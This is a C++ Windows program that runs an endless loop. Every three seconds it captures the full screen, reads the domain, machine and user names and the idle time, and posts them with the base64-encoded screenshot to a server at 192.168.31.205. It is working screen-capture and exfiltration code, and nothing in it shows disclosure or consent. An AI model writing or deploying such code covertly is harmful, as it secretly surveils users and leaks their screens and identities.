#include <iostream>
#include <windows.h>
#include <cpr/cpr.h>
#include <sstream>
#include <string>
#include "base64.h"
#pragma warning(disable : 4996)
inline int GetFilePointer(HANDLE FileHandle) {
    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
}

bool SaveBMPFile(char* filename, HBITMAP bitmap, HDC bitmapDC, int width, int height) {
    bool Success = 0;
    HBITMAP OffscrBmp = NULL;
    HDC OffscrDC = NULL;
    LPBITMAPINFO lpbi = NULL;
    LPVOID lpvBits = NULL;
    HANDLE BmpFile = INVALID_HANDLE_VALUE;
    BITMAPFILEHEADER bmfh;
    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return 0;
    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
        return 0;
    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
    if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
        return 0;
    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    SelectObject(OffscrDC, OldBmp);
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
        return 0;
    if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
        return 0;
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
        return 0;
    if ((BmpFile = CreateFileA(filename,
        GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL)) == INVALID_HANDLE_VALUE)
        return 0;
    DWORD Written;
    bmfh.bfType = 19778;
    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return 0;
    if (Written < sizeof(bmfh))
        return 0;
    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
        return 0;
    if (Written < sizeof(BITMAPINFOHEADER))
        return 0;
    int PalEntries;
    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
        PalEntries = 3;
    else PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
        (int)(1 << lpbi->bmiHeader.biBitCount) : 0;
    if (lpbi->bmiHeader.biClrUsed)
        PalEntries = lpbi->bmiHeader.biClrUsed;
    if (PalEntries) {
        if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
            return 0;
        if (Written < PalEntries * sizeof(RGBQUAD))
            return 0;
    }
    bmfh.bfOffBits = GetFilePointer(BmpFile);
    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
        return 0;
    if (Written < lpbi->bmiHeader.biSizeImage)
        return 0;
    bmfh.bfSize = GetFilePointer(BmpFile);
    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return 0;
    if (Written < sizeof(bmfh))
        return 0;


    CloseHandle(BmpFile);

    delete[](char*)lpvBits;
    delete[] lpbi;

    DeleteDC(OffscrDC);
    DeleteObject(OffscrBmp);


    return 1;
}

bool ScreenCapture(int x, int y, int width, int height, char* filename, HWND hwnd) {


    HDC hDC = GetDC(hwnd);
    HDC hDc = CreateCompatibleDC(hDC);


    HBITMAP hBmp = CreateCompatibleBitmap(hDC, width, height);


    HGDIOBJ old = SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, hDC, x, y, SRCCOPY);

    bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);


    SelectObject(hDc, old);

    DeleteObject(hBmp);

    DeleteDC(hDc);
    ReleaseDC(hwnd, hDC);

    return ret;
}

int main() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);

    char a[] = "c://dev/screen.bmp";

    DWORD bufSize = MAX_PATH;
    TCHAR domainNameBuf[MAX_PATH];

    GetComputerNameEx(ComputerNameDnsDomain, domainNameBuf, &bufSize);
    char domainName[MAX_PATH];
    //wcstombs(domainName, domainNameBuf, wcslen(domainNameBuf) + 1);

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    char userName[20];
    DWORD size_user_name = sizeof(userName);
    GetUserNameA(userName, &size_user_name);

    while (true) {
        GetLastInputInfo(&lii);
        DWORD idleTime = GetTickCount() - lii.dwTime;

        ScreenCapture(0, 0, 1920, 1080, a, NULL);

        Base64 test("c://dev/screen.bmp", Base64::FileEncode);

        std::ostringstream json;
        json << R"({"last_activity":)" << idleTime / 1000 << R"(, "domain":")" << domainNameBuf << R"(", "machine":")" << computerName << R"(", "username":")" << userName << R"(", "screenshot":")" << test.encode() << R"("})";
        std::string jsonStr = json.str();

        auto r = cpr::Post(cpr::Url{ "http://192.168.31.205:8000/activity_report" },
            cpr::Body{ jsonStr },
            cpr::Header{ { "Content-Type", "application/json" } });

        Sleep(3000);
    }

    return 0;
}
